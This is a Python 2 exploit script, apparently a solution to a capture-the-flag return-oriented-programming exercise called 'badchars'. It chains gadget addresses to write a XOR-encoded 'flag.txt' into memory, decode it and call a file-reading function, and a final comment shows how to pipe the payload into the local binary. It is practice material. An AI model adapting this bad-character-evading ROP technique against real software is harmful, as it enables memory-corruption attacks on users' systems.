#!/bin/python2
pattern      = "A"*40
 
#Badchars 'x' 'g' 'a' '.'
#We need to do a XOR in the string to turns it a 'flag.txt' again and 
#do a calling convetion to call the function.
#The flag will be written in the data with the mov instruction.
 
open_file    = "\x20\x06\x40\x00\x00\x00\x00\x00"
flag         = "\x64\x6e\x63\x65\x2c\x76\x7a\x76"
data_section = "\x38\x10\x60\x00\x00\x00\x00\x00"
 
pops12      = "\x9c\x06\x40\x00\x00\x00\x00\x00"
nothing     = "\x01\x00\x00\x00\x00\x00\x00\x00"
movs13      = "\x34\x06\x40\x00\x00\x00\x00\x00"
 
#Write XORED flag in data section.
payload = pattern+pops12+flag+data_section+nothing+nothing+movs13
 
#XOR each address of the string in data section.
pop         = "\xa0\x06\x40\x00\x00\x00\x00\x00"
xor         = "\x28\x06\x40\x00\x00\x00\x00\x00"
data1       = "\x38\x10\x60\x00\x00\x00\x00\x00"
data2       = "\x39\x10\x60\x00\x00\x00\x00\x00"
data3       = "\x3A\x10\x60\x00\x00\x00\x00\x00"
data4       = "\x3B\x10\x60\x00\x00\x00\x00\x00"
data5       = "\x3C\x10\x60\x00\x00\x00\x00\x00"
data6       = "\x3D\x10\x60\x00\x00\x00\x00\x00"
data7       = "\x3E\x10\x60\x00\x00\x00\x00\x00"
data8       = "\x3F\x10\x60\x00\x00\x00\x00\x00"
num2        = "\x02\x00\x00\x00\x00\x00\x00\x00"
rdi         = "\xa3\x06\x40\x00\x00\x00\x00\x00"
 
payload += pop+num2+data1+xor+pop+num2+data2+xor+pop+num2+data3+xor
payload += pop+num2+data4+xor+pop+num2+data5+xor+pop+num2+data6+xor
payload += pop+num2+data7+xor+pop+num2+data8+xor+rdi+data_section+open_file

print(payload)
#(python2 exploit2.py;cat ) | /home/user/Desktop/badchars